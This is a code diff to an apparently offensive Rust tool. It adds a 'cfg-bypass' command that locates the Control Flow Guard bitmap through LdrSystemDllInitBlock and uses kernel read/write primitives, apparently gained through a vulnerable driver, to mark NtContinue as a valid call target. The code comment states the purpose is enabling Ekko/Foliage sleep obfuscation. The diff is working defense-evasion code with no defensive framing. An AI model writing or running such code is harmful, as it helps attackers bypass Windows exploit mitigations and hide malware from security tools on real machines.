@@ -317,6 +317,77 @@ fn main() {
             }
         }
 
+        "cfg-bypass" => {
+            // Mark NtContinue as valid CFG call target via kernel r/w.
+            // Enables Ekko/Foliage sleep obfuscation on CFG-enabled processes.
+            let nt_continue = unsafe {
+                let ntdll = winapi_get_module_handle("ntdll.dll\0");
+                if ntdll.is_null() {
+                    eprintln!("[!] ntdll not found");
+                    std::process::exit(5);
+                }
+                winapi_get_proc_address(ntdll, "NtContinue\0".as_ptr())
+            };
+            if nt_continue.is_null() {
+                eprintln!("[!] NtContinue not found in ntdll");
+                std::process::exit(5);
+            }
+            let nt_continue_addr = nt_continue as usize;
+            eprintln!("[*] NtContinue at 0x{nt_continue_addr:x}");
+
+            let init_block = unsafe {
+                let ntdll = winapi_get_module_handle("ntdll.dll\0");
+                winapi_get_proc_address(ntdll, "LdrSystemDllInitBlock\0".as_ptr())
+            };
+            if init_block.is_null() {
+                eprintln!("[!] LdrSystemDllInitBlock not found");
+                std::process::exit(5);
+            }
+            let init_addr = init_block as usize;
+            let block_size = unsafe { *(init_addr as *const u32) } as usize;
+            eprintln!("[*] LdrSystemDllInitBlock size = 0x{block_size:x}");
+
+            let cfg_off: usize = if block_size <= 0x70 { 0x40 }
+                else if block_size <= 0xF8 { 0x60 }
+                else { 0x68 };
+
+            let bitmap_addr = unsafe { *((init_addr + cfg_off) as *const usize) };
+            let bitmap_size = unsafe { *((init_addr + cfg_off + 8) as *const usize) };
+            eprintln!("[*] CFG bitmap at 0x{bitmap_addr:x}, size 0x{bitmap_size:x}");
+            if bitmap_addr == 0 || bitmap_size == 0 {
+                eprintln!("[!] CFG bitmap unavailable");
+                std::process::exit(5);
+            }
+
+            let bit = nt_continue_addr >> 4;
+            let boff = bit >> 3;
+            let bpos = (bit & 7) as u8;
+            if boff >= bitmap_size {
+                eprintln!("[!] address outside bitmap");
+                std::process::exit(5);
+            }
+
+            let va = bitmap_addr + boff;
+            let mut buf = [0u8; 1];
+            tier.rw.kread(va, &mut buf).unwrap_or_else(|e| {
+                eprintln!("[!] CFG bitmap read failed: {e:?}");
+                std::process::exit(5);
+            });
+            let old = buf[0];
+            let was = (old >> bpos) & 1;
+            buf[0] |= 1 << bpos;
+            if buf[0] != old {
+                tier.rw.kwrite(va, &buf).unwrap_or_else(|e| {
+                    eprintln!("[!] CFG bitmap write failed: {e:?}");
+                    std::process::exit(5);
+                });
+                eprintln!("[+] NtContinue CFG bit SET (off={boff}, bit={bpos})");
+            } else {
+                eprintln!("[+] already set (off={boff}, bit={bpos})");
+            }
+            eprintln!("[*] old={old:#04x} new={:#04x} was_set={was}", buf[0]);
+        }
+
         _ => {
             eprintln!("unknown command: {cmd}");
             std::process::exit(1);
@@ -582,11 +653,29 @@ fn parse_byovd(args: &[String]) -> (Option<String>, Option<String>) {
     (args.get(idx + 1).cloned(), args.get(idx + 2).cloned())
 }
 
+
 #[cfg(target_os = "windows")]
 fn parse_pid(args: &[String], pos: usize) -> u32 {
     args.get(pos).and_then(|s| s.parse().ok()).unwrap_or(0)
 }
 
+
+// ---- Windows FFI helpers for cfg-bypass ----
+#[cfg(target_os = "windows")]
+extern "system" {
+    fn GetModuleHandleA(lpModuleName: *const u8) -> *mut core::ffi::c_void;
+    fn GetProcAddress(hModule: *mut core::ffi::c_void, lpProcName: *const u8) -> *mut core::ffi::c_void;
+}
+
+#[cfg(target_os = "windows")]
+unsafe fn winapi_get_module_handle(name: &str) -> *mut core::ffi::c_void {
+    unsafe { GetModuleHandleA(name.as_ptr()) }
+}
+
+#[cfg(target_os = "windows")]
+unsafe fn winapi_get_proc_address(h: *mut core::ffi::c_void, name: *const u8) -> *mut core::ffi::c_void {
+    unsafe { GetProcAddress(h, name) }
+}
 // ---- Non-Windows stub (so `cargo check` on macOS doesn't hard-error) ----
 #[cfg(not(target_os = "windows"))]
 fn main() {
